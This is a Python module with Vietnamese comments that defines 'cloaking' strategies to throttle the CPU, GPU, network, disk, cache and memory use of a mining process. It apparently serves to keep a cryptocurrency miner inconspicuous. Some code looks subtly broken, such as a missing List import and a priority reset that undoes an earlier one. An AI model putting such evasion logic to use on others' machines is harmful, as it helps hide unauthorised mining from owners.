# cloak_strategies.py

import logging
import subprocess
import psutil
import pynvml
import traceback
from abc import ABC, abstractmethod
from typing import Dict, Any, Tuple, Optional, Type

from .utils import MiningProcess  # Import MiningProcess từ utils.py
from .resource_control import (
    ResourceControlFactory,
    CPUResourceManager,
    GPUResourceManager,
    NetworkResourceManager,
    DiskIOResourceManager,
    CacheResourceManager,
    MemoryResourceManager
)


class CloakStrategy(ABC):
    """
    Lớp cơ sở cho các chiến lược cloaking khác nhau.
    """

    @abstractmethod
    def apply(self, process: MiningProcess, resource_managers: Dict[str, Any]) -> None:
        """
        Áp dụng chiến lược cloaking cho tiến trình đã cho thông qua các resource managers.

        Args:
            process (MiningProcess): Đối tượng tiến trình.
            resource_managers (Dict[str, Any]): Dictionary chứa các resource managers.
        """
        pass


class CpuCloakStrategy(CloakStrategy):
    """
    Chiến lược cloaking CPU:
      - Giới hạn sử dụng CPU thông qua việc điều chỉnh độ ưu tiên.
      - Tối ưu hóa việc sử dụng cache CPU.
      - Đặt affinity cho các thread vào các core CPU cụ thể.
    """

    def __init__(
        self,
        config: Dict[str, Any],
        logger: logging.Logger,
        cpu_resource_manager: CPUResourceManager
    ):
        """
        Khởi tạo CpuCloakStrategy với cấu hình, logger và CPUResourceManager.

        Args:
            config (Dict[str, Any]): Cấu hình cho chiến lược cloaking CPU.
            logger (logging.Logger): Logger để ghi log.
            cpu_resource_manager (CPUResourceManager): Instance của CPUResourceManager từ resource_control.py.
        """
        # Lấy cấu hình throttle_percentage với giá trị mặc định là 20%
        self.throttle_percentage = config.get('throttle_percentage', 20)
        if not isinstance(self.throttle_percentage, (int, float)) or not (0 <= self.throttle_percentage <= 100):
            logger.warning("Giá trị throttle_percentage không hợp lệ, mặc định 20%.")
            self.throttle_percentage = 20

        self.logger = logger
        self.cpu_resource_manager = cpu_resource_manager

    def apply(self, process: MiningProcess, resource_managers: Dict[str, Any]) -> None:
        """
        Áp dụng chiến lược cloaking CPU cho tiến trình đã cho thông qua CPUResourceManager.

        Args:
            process (MiningProcess): Đối tượng tiến trình.
            resource_managers (Dict[str, Any]): Dictionary chứa các resource managers.
        """
        try:
            pid, process_name = self.get_process_info(process)

            # Thiết lập độ ưu tiên CPU thông qua CPUResourceManager
            cpu_priority = self.calculate_cpu_priority()
            success = self.cpu_resource_manager.set_cpu_priority(pid, cpu_priority)
            if success:
                self.logger.info(f"Đặt độ ưu tiên CPU cho tiến trình {process_name} (PID: {pid}) thành công.")
            else:
                self.logger.error(f"Không thể đặt độ ưu tiên CPU cho tiến trình {process_name} (PID: {pid}).")
                return

            # Tối ưu hóa việc sử dụng cache
            self.optimize_cache(pid)

            # Đặt CPU affinity
            cpu_manager: CPUResourceManager = resource_managers.get('cpu')
            self.set_thread_affinity(pid, cpu_manager)

        except psutil.NoSuchProcess as e:
            self.logger.error(f"Tiến trình không tồn tại: {e}")
        except psutil.AccessDenied as e:
            self.logger.error(f"Không đủ quyền để áp dụng cloaking CPU cho PID {process.pid}: {e}")
        except Exception as e:
            self.logger.error(
                f"Lỗi khi áp dụng cloaking CPU cho tiến trình {process.name} (PID: {process.pid}): {e}\n{traceback.format_exc()}"
            )
            raise

    def calculate_cpu_priority(self) -> int:
        """
        Tính toán độ ưu tiên CPU dựa trên throttle_percentage.

        Returns:
            int: Giá trị độ ưu tiên CPU (từ -20 đến 19, với -20 là ưu tiên cao nhất).
        """
        # Giảm độ ưu tiên dựa trên throttle_percentage
        # Mô phỏng việc giảm sử dụng CPU bằng cách tăng giá trị nice
        # Nếu throttle_percentage cao hơn, nice sẽ cao hơn (ít ưu tiên hơn)
        nice_value = int((self.throttle_percentage / 100) * 19)
        return nice_value

    def optimize_cache(self, pid: int) -> None:
        """
        Tối ưu hóa việc sử dụng cache CPU bằng cách đặt độ ưu tiên tiến trình.

        Args:
            pid (int): PID của tiến trình.
        """
        try:
            process = psutil.Process(pid)
            process.nice(psutil.NORMAL_PRIORITY_CLASS)
            self.logger.info(f"Tối ưu hóa cache cho tiến trình PID {pid} bằng cách đặt độ ưu tiên.")
        except psutil.NoSuchProcess:
            self.logger.warning(f"Tiến trình PID {pid} không tồn tại. Không thể tối ưu hóa cache.")
        except psutil.AccessDenied:
            self.logger.error(f"Không đủ quyền để tối ưu hóa cache cho PID {pid}.")
        except Exception as e:
            self.logger.error(f"Lỗi khi tối ưu hóa cache cho PID {pid}: {e}")

    def set_thread_affinity(self, pid: int, cpu_resource_manager: Optional[CPUResourceManager], cpu_threads: Optional[List[int]] = None) -> None:
        """
        Đặt affinity cho thread của tiến trình bằng cách sử dụng CPUResourceManager.

        Args:
            pid (int): PID của tiến trình.
            cpu_resource_manager (Optional[CPUResourceManager]): Instance của CPUResourceManager.
            cpu_threads (Optional[List[int]]): Danh sách các core CPU để đặt affinity.
        """
        try:
            if not cpu_resource_manager:
                self.logger.error(f"Không có CPUResourceManager được cung cấp cho PID {pid}. Không thể đặt affinity cho thread.")
                return

            # Lấy danh sách các core CPU có sẵn
            available_cpus = cpu_resource_manager.get_available_cpus()
            if not available_cpus:
                self.logger.warning(f"Không tìm thấy CPU cores có sẵn để đặt affinity cho PID {pid}.")
                return

            # Nếu có danh sách cpu_threads ban đầu, sử dụng để khôi phục
            target_cpus = cpu_threads if cpu_threads else available_cpus

            # Đặt CPU affinity cho tiến trình
            process = psutil.Process(pid)
            process.cpu_affinity(target_cpus)
            self.logger.info(f"Đặt CPU affinity cho tiến trình PID {pid} vào các core {target_cpus}.")

        except psutil.NoSuchProcess:
            self.logger.warning(f"Tiến trình PID={pid} không tồn tại. Không thể đặt affinity cho thread.")
        except psutil.AccessDenied:
            self.logger.error(f"Không đủ quyền để đặt CPU affinity cho PID {pid}.")
        except Exception as e:
            self.logger.error(f"Lỗi khi đặt affinity cho thread cho PID {pid}: {e}\n{traceback.format_exc()}")

    def get_process_info(self, process: MiningProcess) -> Tuple[int, str]:
        """
        Lấy PID và tên tiến trình từ đối tượng process.

        Args:
            process (MiningProcess): Đối tượng tiến trình.

        Returns:
            Tuple[int, str]: PID và tên tiến trình.
        """
        return process.pid, process.name


class GpuCloakStrategy(CloakStrategy):
    """
    Chiến lược cloaking GPU:
      - Giới hạn power limit của GPU.
      - Tùy chọn điều chỉnh xung nhịp GPU.
      - Giới hạn nhiệt độ của GPU.
    """

    def __init__(
        self,
        config: Dict[str, Any],
        logger: logging.Logger,
        gpu_resource_manager: GPUResourceManager
    ):
        """
        Khởi tạo GpuCloakStrategy với cấu hình, logger và GPUResourceManager.

        Args:
            config (Dict[str, Any]): Cấu hình cho chiến lược cloaking GPU.
            logger (logging.Logger): Logger để ghi log.
            gpu_resource_manager (GPUResourceManager): Instance của GPUResourceManager từ resource_control.py.
        """
        # Lấy cấu hình throttle_percentage với giá trị mặc định là 20%
        self.throttle_percentage = config.get('throttle_percentage', 20)
        if not isinstance(self.throttle_percentage, (int, float)) or not (0 <= self.throttle_percentage <= 100):
            logger.warning("Giá trị throttle_percentage không hợp lệ, mặc định 20%.")
            self.throttle_percentage = 20

        # Lấy cấu hình sm_clock và mem_clock với các giá trị mặc định
        self.target_sm_clock = config.get('sm_clock', 1300)   # MHz
        self.target_mem_clock = config.get('mem_clock', 800)  # MHz

        # Lấy cấu hình temperature_threshold với giá trị mặc định là 80°C
        self.temperature_threshold = config.get('temperature_threshold', 80)  # °C
        if not isinstance(self.temperature_threshold, (int, float)) or self.temperature_threshold <= 0:
            logger.warning("Giá trị temperature_threshold không hợp lệ, mặc định 80°C.")
            self.temperature_threshold = 80

        # Lấy cấu hình fan_speed_increase với giá trị mặc định là 20% (nếu hỗ trợ)
        self.fan_speed_increase = config.get('fan_speed_increase', 20)  # %
        if not isinstance(self.fan_speed_increase, (int, float)) or not (0 <= self.fan_speed_increase <= 100):
            logger.warning("Giá trị fan_speed_increase không hợp lệ, mặc định 20%.")
            self.fan_speed_increase = 20

        self.logger = logger
        self.gpu_resource_manager = gpu_resource_manager

    def apply(self, process: MiningProcess, resource_managers: Dict[str, Any]) -> None:
        """
        Áp dụng chiến lược cloaking GPU cho tiến trình đã cho thông qua GPUResourceManager.

        Args:
            process (MiningProcess): Đối tượng tiến trình.
            resource_managers (Dict[str, Any]): Dictionary chứa các resource managers.
        """
        try:
            pid, process_name = self.get_process_info(process)
            gpu_resource_manager: GPUResourceManager = resource_managers.get('gpu')

            if not gpu_resource_manager:
                self.logger.error(f"GPUResourceManager không được tìm thấy cho PID {pid}.")
                return

            gpu_index = self.assign_gpu(pid)
            if gpu_index == -1:
                self.logger.warning(f"Không thể gán GPU cho tiến trình {process_name} (PID: {pid}).")
                return

            # Thiết lập power limit
            desired_power_limit_w = self.calculate_desired_power_limit(gpu_index)
            success_power = gpu_resource_manager.set_gpu_power_limit(gpu_index, desired_power_limit_w)
            if success_power:
                self.logger.info(f"Đặt power limit GPU {gpu_index} thành công lên {desired_power_limit_w}W cho tiến trình {process_name} (PID: {pid}).")
            else:
                self.logger.error(f"Không thể đặt power limit GPU {gpu_index} cho tiến trình {process_name} (PID: {pid}).")

            # Thiết lập xung nhịp GPU
            success_clocks = gpu_resource_manager.set_gpu_clocks(gpu_index, self.target_sm_clock, self.target_mem_clock)
            if success_clocks:
                self.logger.info(f"Đặt xung nhịp GPU {gpu_index}: SM={self.target_sm_clock}MHz, MEM={self.target_mem_clock}MHz cho tiến trình {process_name} (PID: {pid}).")
            else:
                self.logger.warning(f"Không thể đặt xung nhịp GPU {gpu_index} cho tiến trình {process_name} (PID: {pid}).")

            # Giới hạn nhiệt độ GPU
            success_temp = gpu_resource_manager.limit_temperature(
                gpu_index,
                self.temperature_threshold,
                self.fan_speed_increase
            )
            if success_temp:
                self.logger.info(f"Giới hạn nhiệt độ GPU {gpu_index} thành công cho tiến trình {process_name} (PID: {pid}).")
            else:
                self.logger.warning(f"Không thể giới hạn nhiệt độ GPU {gpu_index} cho tiến trình {process_name} (PID: {pid}).")

        except Exception as e:
            self.logger.error(
                f"Lỗi khi áp dụng cloaking GPU cho tiến trình {process.name} (PID: {process.pid}): {e}\n{traceback.format_exc()}"
            )
            raise

    def calculate_desired_power_limit(self, gpu_index: int) -> int:
        """
        Tính toán power limit mới dựa trên throttle_percentage.

        Args:
            gpu_index (int): Chỉ số GPU.

        Returns:
            int: Power limit mới tính bằng Watts.
        """
        current_power_limit = self.gpu_resource_manager.get_gpu_power_limit(gpu_index)
        if current_power_limit is None:
            self.logger.warning(f"Không thể lấy power limit hiện tại cho GPU {gpu_index}. Sử dụng giá trị mặc định.")
            current_power_limit = 100  # Giá trị mặc định nếu không thể lấy

        desired_power_limit_w = int(round(current_power_limit * (1 - self.throttle_percentage / 100)))
        self.logger.debug(f"Tính toán power limit mới cho GPU {gpu_index}: {desired_power_limit_w}W.")
        return desired_power_limit_w

    def assign_gpu(self, pid: int) -> int:
        """
        Gán GPU cho tiến trình dựa trên PID.

        Args:
            pid (int): PID của tiến trình.

        Returns:
            int: Chỉ số GPU được gán hoặc -1 nếu không thể gán.
        """
        gpu_count = self.gpu_resource_manager.gpu_manager.gpu_count
        if gpu_count <= 0:
            return -1
        assigned_gpu = pid % gpu_count
        self.logger.debug(f"Đã gán GPU {assigned_gpu} cho PID {pid}.")
        return assigned_gpu

    def get_process_info(self, process: MiningProcess) -> Tuple[int, str]:
        """
        Lấy PID và tên tiến trình từ đối tượng process.

        Args:
            process (MiningProcess): Đối tượng tiến trình.

        Returns:
            Tuple[int, str]: PID và tên tiến trình.
        """
        return process.pid, process.name


class NetworkCloakStrategy(CloakStrategy):
    """
    Chiến lược cloaking mạng:
      - Giảm băng thông mạng cho tiến trình.
    """

    def __init__(
        self,
        config: Dict[str, Any],
        logger: logging.Logger,
        network_resource_manager: NetworkResourceManager
    ):
        """
        Khởi tạo NetworkCloakStrategy với cấu hình, logger và NetworkResourceManager.

        Args:
            config (Dict[str, Any]): Cấu hình cho chiến lược cloaking Network.
            logger (logging.Logger): Logger để ghi log.
            network_resource_manager (NetworkResourceManager): Instance của NetworkResourceManager từ resource_control.py.
        """
        # Lấy cấu hình bandwidth_reduction_mbps với giá trị mặc định là 10Mbps
        self.bandwidth_reduction_mbps = config.get('bandwidth_reduction_mbps', 10)
        if not isinstance(self.bandwidth_reduction_mbps, (int, float)) or self.bandwidth_reduction_mbps <= 0:
            logger.warning("Giá trị bandwidth_reduction_mbps không hợp lệ, mặc định 10Mbps.")
            self.bandwidth_reduction_mbps = 10

        # Lấy cấu hình network_interface hoặc tự động xác định
        self.network_interface = config.get('network_interface')
        self.logger = logger
        self.network_resource_manager = network_resource_manager

        if not self.network_interface:
            self.network_interface = self.get_primary_network_interface()
            if not self.network_interface:
                self.logger.warning("Không thể xác định giao diện mạng. Mặc định là 'eth0'.")
                self.network_interface = "eth0"
            self.logger.info(f"Giao diện mạng chính xác định: {self.network_interface}")

    def apply(self, process: MiningProcess, resource_managers: Dict[str, Any]) -> None:
        """
        Áp dụng chiến lược cloaking mạng cho tiến trình đã cho thông qua NetworkResourceManager.

        Args:
            process (MiningProcess): Đối tượng tiến trình.
            resource_managers (Dict[str, Any]): Dictionary chứa các resource managers.
        """
        try:
            pid, process_name = self.get_process_info(process)

            # Định nghĩa fwmark cho tiến trình cụ thể
            mark = pid % 32768  # fwmark phải < 65536
            self.logger.debug(f"Đặt fwmark={mark} cho tiến trình PID={pid}.")

            # Thêm quy tắc iptables để đánh dấu các gói tin từ PID này thông qua NetworkResourceManager
            success_mark = self.network_resource_manager.mark_packets(pid, mark)
            if not success_mark:
                self.logger.error(f"Không thể thêm iptables MARK cho tiến trình {process_name} (PID: {pid}) với mark={mark}.")
                return

            # Thiết lập băng thông mạng thông qua NetworkResourceManager
            success_limit = self.network_resource_manager.limit_bandwidth(
                self.network_interface,
                mark,
                self.bandwidth_reduction_mbps
            )
            if not success_limit:
                self.logger.error(f"Không thể giới hạn băng thông mạng cho tiến trình {process_name} (PID: {pid}) với mark={mark} trên giao diện '{self.network_interface}'.")
                return

            self.logger.info(
                f"Áp dụng cloaking mạng cho tiến trình {process_name} (PID: {pid}): "
                f"Giới hạn băng thông={self.bandwidth_reduction_mbps}Mbps trên giao diện '{self.network_interface}'."
            )

        except psutil.NoSuchProcess as e:
            self.logger.error(f"Tiến trình không tồn tại: {e}")
        except psutil.AccessDenied as e:
            self.logger.error(f"Không đủ quyền để áp dụng cloaking mạng cho PID {process.pid}: {e}")
        except Exception as e:
            self.logger.error(
                f"Lỗi khi áp dụng cloaking mạng cho tiến trình {process.name} (PID: {process.pid}): {e}\n{traceback.format_exc()}"
            )
            raise

    def get_process_info(self, process: MiningProcess) -> Tuple[int, str]:
        """
        Lấy PID và tên tiến trình từ đối tượng process.

        Args:
            process (MiningProcess): Đối tượng tiến trình.

        Returns:
            Tuple[int, str]: PID và tên tiến trình.
        """
        return process.pid, process.name

    def get_primary_network_interface(self) -> Optional[str]:
        """
        Tự động xác định giao diện mạng chính.

        Returns:
            Optional[str]: Tên giao diện mạng hoặc None nếu không xác định được.
        """
        try:
            addrs = psutil.net_if_addrs()
            for iface, addr_list in addrs.items():
                for addr in addr_list:
                    if addr.family == psutil.AF_LINK:
                        # Giả sử giao diện có địa chỉ MAC là giao diện chính
                        return iface
            return None
        except Exception as e:
            self.logger.error(f"Lỗi khi xác định giao diện mạng chính: {e}")
            return None


class DiskIoCloakStrategy(CloakStrategy):
    """
    Chiến lược cloaking Disk I/O:
      - Đặt trọng số I/O cho tiến trình bằng cách sử dụng DiskIOResourceManager.
    """

    def __init__(
        self,
        config: Dict[str, Any],
        logger: logging.Logger,
        disk_io_resource_manager: DiskIOResourceManager
    ):
        """
        Khởi tạo DiskIoCloakStrategy với cấu hình, logger và DiskIOResourceManager.

        Args:
            config (Dict[str, Any]): Cấu hình cho chiến lược cloaking Disk I/O.
            logger (logging.Logger): Logger để ghi log.
            disk_io_resource_manager (DiskIOResourceManager): Instance của DiskIOResourceManager từ resource_control.py.
        """
        # Lấy cấu hình io_weight với giá trị mặc định là 500
        self.io_weight = config.get('io_weight', 500)
        if not isinstance(self.io_weight, int) or not (1 <= self.io_weight <= 1000):
            logger.warning(f"Giá trị io_weight không hợp lệ: {self.io_weight}. Mặc định là 500.")
            self.io_weight = 500
        self.logger = logger
        self.disk_io_resource_manager = disk_io_resource_manager

    def apply(self, process: MiningProcess, resource_managers: Dict[str, Any]) -> None:
        """
        Áp dụng chiến lược cloaking Disk I/O cho tiến trình đã cho thông qua DiskIOResourceManager.

        Args:
            process (MiningProcess): Đối tượng tiến trình.
            resource_managers (Dict[str, Any]): Dictionary chứa các resource managers.
        """
        try:
            pid, process_name = self.get_process_info(process)

            # Đặt trọng số I/O thông qua DiskIOResourceManager
            success = self.disk_io_resource_manager.set_io_weight(pid, self.io_weight)
            if success:
                self.logger.info(f"Đặt I/O weight là {self.io_weight} cho tiến trình {process_name} (PID: {pid}).")
            else:
                self.logger.error(f"Không thể đặt I/O weight là {self.io_weight} cho tiến trình {process_name} (PID: {pid}).")
                return

            self.logger.info(
                f"Áp dụng cloaking Disk I/O cho tiến trình {process_name} (PID: {pid}): io_weight={self.io_weight}."
            )

        except psutil.NoSuchProcess as e:
            self.logger.error(f"Tiến trình không tồn tại: {e}")
        except psutil.AccessDenied as e:
            self.logger.error(f"Không đủ quyền để áp dụng cloaking Disk I/O cho PID {process.pid}: {e}")
        except Exception as e:
            self.logger.error(
                f"Lỗi khi áp dụng cloaking Disk I/O cho tiến trình {process.name} (PID: {process.pid}): {e}\n{traceback.format_exc()}"
            )
            raise

    def get_process_info(self, process: MiningProcess) -> Tuple[int, str]:
        """
        Lấy PID và tên tiến trình từ đối tượng process.

        Args:
            process (MiningProcess): Đối tượng tiến trình.

        Returns:
            Tuple[int, str]: PID và tên tiến trình.
        """
        return process.pid, process.name


class CacheCloakStrategy(CloakStrategy):
    """
    Chiến lược cloaking Cache:
      - Drop caches.
      - Giới hạn mức sử dụng cache thông qua CacheResourceManager.
    """

    def __init__(
        self,
        config: Dict[str, Any],
        logger: logging.Logger,
        cache_resource_manager: CacheResourceManager
    ):
        """
        Khởi tạo CacheCloakStrategy với cấu hình, logger và CacheResourceManager.

        Args:
            config (Dict[str, Any]): Cấu hình cho chiến lược cloaking Cache.
            logger (logging.Logger): Logger để ghi log.
            cache_resource_manager (CacheResourceManager): Instance của CacheResourceManager từ resource_control.py.
        """
        # Lấy cấu hình cache_limit_percent với giá trị mặc định là 50%
        self.cache_limit_percent = config.get('cache_limit_percent', 50)
        if not (0 <= self.cache_limit_percent <= 100):
            logger.warning(f"Giá trị cache_limit_percent không hợp lệ: {self.cache_limit_percent}. Mặc định là 50%.")
            self.cache_limit_percent = 50
        self.logger = logger
        self.cache_resource_manager = cache_resource_manager

    def apply(self, process: MiningProcess, resource_managers: Dict[str, Any]) -> None:
        """
        Áp dụng chiến lược cloaking Cache cho tiến trình đã cho thông qua CacheResourceManager.

        Args:
            process (MiningProcess): Đối tượng tiến trình.
            resource_managers (Dict[str, Any]): Dictionary chứa các resource managers.
        """
        try:
            pid, process_name = self.get_process_info(process)

            # Drop caches thông qua CacheResourceManager
            success_drop = self.cache_resource_manager.drop_caches()
            if success_drop:
                self.logger.info(f"Đã drop caches để giảm sử dụng cache cho tiến trình {process_name} (PID: {pid}).")
            else:
                self.logger.error(f"Không thể drop caches cho tiến trình {process_name} (PID: {pid}).")

            # Giới hạn cache sử dụng thông qua CacheResourceManager
            success_limit = self.cache_resource_manager.limit_cache_usage(self.cache_limit_percent)
            if success_limit:
                self.logger.info(f"Đặt giới hạn cache thành {self.cache_limit_percent}% cho tiến trình {process_name} (PID: {pid}).")
            else:
                self.logger.error(f"Không thể đặt giới hạn cache cho tiến trình {process_name} (PID: {pid}).")

            self.logger.info(
                f"Áp dụng cloaking Cache cho tiến trình {process_name} (PID: {pid}): "
                f"drop_caches=True, cache_limit_percent={self.cache_limit_percent}%."
            )

        except PermissionError as e:
            self.logger.error(
                f"Không đủ quyền để drop caches. Cloaking Cache thất bại cho tiến trình {process.name} (PID: {process.pid})."
            )
            raise
        except psutil.NoSuchProcess as e:
            self.logger.error(f"Tiến trình không tồn tại: {e}")
        except psutil.AccessDenied as e:
            self.logger.error(f"Không đủ quyền để áp dụng cloaking Cache cho PID {process.pid}: {e}")
        except Exception as e:
            self.logger.error(
                f"Lỗi bất ngờ khi áp dụng cloaking Cache cho tiến trình {process.name} (PID: {process.pid}): {e}\n{traceback.format_exc()}"
            )
            raise

    def get_process_info(self, process: MiningProcess) -> Tuple[int, str]:
        """
        Lấy PID và tên tiến trình từ đối tượng process.

        Args:
            process (MiningProcess): Đối tượng tiến trình.

        Returns:
            Tuple[int, str]: PID và tên tiến trình.
        """
        return process.pid, process.name


class MemoryCloakStrategy(CloakStrategy):
    """
    Chiến lược cloaking Memory:
      - Giới hạn sử dụng bộ nhớ của tiến trình.
      - Giảm sử dụng bộ nhớ bằng cách drop caches nếu cần thiết.
    """

    def __init__(
        self,
        config: Dict[str, Any],
        logger: logging.Logger,
        memory_resource_manager: MemoryResourceManager
    ):
        """
        Khởi tạo MemoryCloakStrategy với cấu hình, logger và MemoryResourceManager.

        Args:
            config (Dict[str, Any]): Cấu hình cho chiến lược cloaking Memory.
            logger (logging.Logger): Logger để ghi log.
            memory_resource_manager (MemoryResourceManager): Instance của MemoryResourceManager từ resource_control.py.
        """
        # Lấy cấu hình memory_limit_percent với giá trị mặc định là 50%
        self.memory_limit_percent = config.get('memory_limit_percent', 50)
        if not (0 <= self.memory_limit_percent <= 100):
            logger.warning(f"Giá trị memory_limit_percent không hợp lệ: {self.memory_limit_percent}. Mặc định là 50%.")
            self.memory_limit_percent = 50
        self.logger = logger
        self.memory_resource_manager = memory_resource_manager

    def apply(self, process: MiningProcess, resource_managers: Dict[str, Any]) -> None:
        """
        Áp dụng chiến lược cloaking Memory cho tiến trình đã cho thông qua MemoryResourceManager và CacheResourceManager.

        Args:
            process (MiningProcess): Đối tượng tiến trình.
            resource_managers (Dict[str, Any]): Dictionary chứa các resource managers.
        """
        try:
            pid, process_name = self.get_process_info(process)

            # Drop caches sử dụng CacheResourceManager
            cache_resource_manager: CacheResourceManager = resource_managers.get('cache')
            if cache_resource_manager:
                success_drop = cache_resource_manager.drop_caches()
                if success_drop:
                    self.logger.info(f"Đã drop caches để giảm sử dụng cache cho tiến trình {process_name} (PID: {pid}).")
                else:
                    self.logger.error(f"Không thể drop caches cho tiến trình {process_name} (PID: {pid}).")
            else:
                self.logger.error("CacheResourceManager không được tìm thấy trong resource_managers. Không thể drop caches.")

            # Giới hạn sử dụng bộ nhớ sử dụng MemoryResourceManager
            memory_limit_mb = self.calculate_memory_limit_mb()
            success_limit = self.memory_resource_manager.set_memory_limit(pid, memory_limit_mb)
            if success_limit:
                self.logger.info(f"Đặt giới hạn bộ nhớ thành {self.memory_limit_percent}% ({memory_limit_mb}MB) cho tiến trình {process_name} (PID: {pid}).")
            else:
                self.logger.error(f"Không thể đặt giới hạn bộ nhớ thành {self.memory_limit_percent}% cho tiến trình {process_name} (PID: {pid}).")

            self.logger.info(
                f"Áp dụng cloaking Memory cho tiến trình {process_name} (PID: {pid}): "
                f"drop_caches=True, memory_limit_percent={self.memory_limit_percent}%."
            )

        except PermissionError as e:
            self.logger.error(
                f"Không đủ quyền để drop caches. Cloaking Memory thất bại cho tiến trình {process.name} (PID: {process.pid})."
            )
            raise
        except psutil.NoSuchProcess as e:
            self.logger.error(f"Tiến trình không tồn tại: {e}")
        except psutil.AccessDenied as e:
            self.logger.error(f"Không đủ quyền để áp dụng cloaking Memory cho PID {process.pid}: {e}")
        except Exception as e:
            self.logger.error(
                f"Lỗi bất ngờ khi áp dụng cloaking Memory cho tiến trình {process.name} (PID: {process.pid}): {e}\n{traceback.format_exc()}"
            )
            raise

    def calculate_memory_limit_mb(self) -> int:
        """
        Tính toán giới hạn bộ nhớ dựa trên memory_limit_percent.

        Returns:
            int: Giới hạn bộ nhớ tính bằng MB.
        """
        total_memory_bytes = psutil.virtual_memory().total
        memory_limit_bytes = int((self.memory_limit_percent / 100) * total_memory_bytes)
        memory_limit_mb = int(memory_limit_bytes / (1024 * 1024))
        self.logger.debug(f"Tính toán giới hạn bộ nhớ: {memory_limit_mb}MB.")
        return memory_limit_mb

    def get_process_info(self, process: MiningProcess) -> Tuple[int, str]:
        """
        Lấy PID và tên tiến trình từ đối tượng process.

        Args:
            process (MiningProcess): Đối tượng tiến trình.

        Returns:
            Tuple[int, str]: PID và tên tiến trình.
        """
        return process.pid, process.name


class CloakStrategyFactory:
    """
    Factory để tạo các instance của các chiến lược cloaking.
    """
    _strategies: Dict[str, Type[CloakStrategy]] = {
        'cpu': CpuCloakStrategy,
        'gpu': GpuCloakStrategy,
        'network': NetworkCloakStrategy,
        'disk_io': DiskIoCloakStrategy,
        'cache': CacheCloakStrategy,
        'memory': MemoryCloakStrategy
    }

    @staticmethod
    def create_strategy(
        strategy_name: str,
        config: Dict[str, Any],
        logger: logging.Logger,
        resource_managers: Dict[str, Any]
    ) -> Optional[CloakStrategy]:
        """
        Tạo một instance của chiến lược cloaking dựa trên tên chiến lược.

        Args:
            strategy_name (str): Tên của chiến lược cloaking.
            config (Dict[str, Any]): Cấu hình cho chiến lược cloaking.
            logger (logging.Logger): Logger để ghi log.
            resource_managers (Dict[str, Any]): Dictionary chứa các resource managers.

        Returns:
            Optional[CloakStrategy]: Instance của chiến lược cloaking hoặc None nếu không tìm thấy.
        """
        strategy_class = CloakStrategyFactory._strategies.get(strategy_name.lower())

        if strategy_class and issubclass(strategy_class, CloakStrategy):
            try:
                if strategy_name.lower() == 'gpu':
                    gpu_resource_manager: GPUResourceManager = resource_managers.get('gpu')
                    if not gpu_resource_manager:
                        logger.error("Không tìm thấy GPUResourceManager trong resource_managers.")
                        return None
                    return strategy_class(
                        config,
                        logger,
                        gpu_resource_manager
                    )
                elif strategy_name.lower() == 'cpu':
                    cpu_resource_manager: CPUResourceManager = resource_managers.get('cpu')
                    if not cpu_resource_manager:
                        logger.error("Không tìm thấy CPUResourceManager trong resource_managers.")
                        return None
                    return strategy_class(
                        config,
                        logger,
                        cpu_resource_manager
                    )
                elif strategy_name.lower() == 'network':
                    network_resource_manager: NetworkResourceManager = resource_managers.get('network')
                    if not network_resource_manager:
                        logger.error("Không tìm thấy NetworkResourceManager trong resource_managers.")
                        return None
                    return strategy_class(
                        config,
                        logger,
                        network_resource_manager
                    )
                elif strategy_name.lower() == 'disk_io':
                    disk_io_resource_manager: DiskIOResourceManager = resource_managers.get('io')
                    if not disk_io_resource_manager:
                        logger.error("Không tìm thấy DiskIOResourceManager trong resource_managers.")
                        return None
                    return strategy_class(
                        config,
                        logger,
                        disk_io_resource_manager
                    )
                elif strategy_name.lower() == 'cache':
                    cache_resource_manager: CacheResourceManager = resource_managers.get('cache')
                    if not cache_resource_manager:
                        logger.error("Không tìm thấy CacheResourceManager trong resource_managers.")
                        return None
                    return strategy_class(
                        config,
                        logger,
                        cache_resource_manager
                    )
                elif strategy_name.lower() == 'memory':
                    memory_resource_manager: MemoryResourceManager = resource_managers.get('memory')
                    if not memory_resource_manager:
                        logger.error("Không tìm thấy MemoryResourceManager trong resource_managers.")
                        return None
                    return strategy_class(
                        config,
                        logger,
                        memory_resource_manager
                    )
                else:
                    logger.warning(f"Chiến lược cloaking '{strategy_name}' không được hỗ trợ.")
                    return None
            except Exception as e:
                logger.error(f"Lỗi khi tạo chiến lược cloaking '{strategy_name}': {e}")
                return None
        else:
            logger.warning(f"Không tìm thấy chiến lược cloaking: {strategy_name}")
            return None
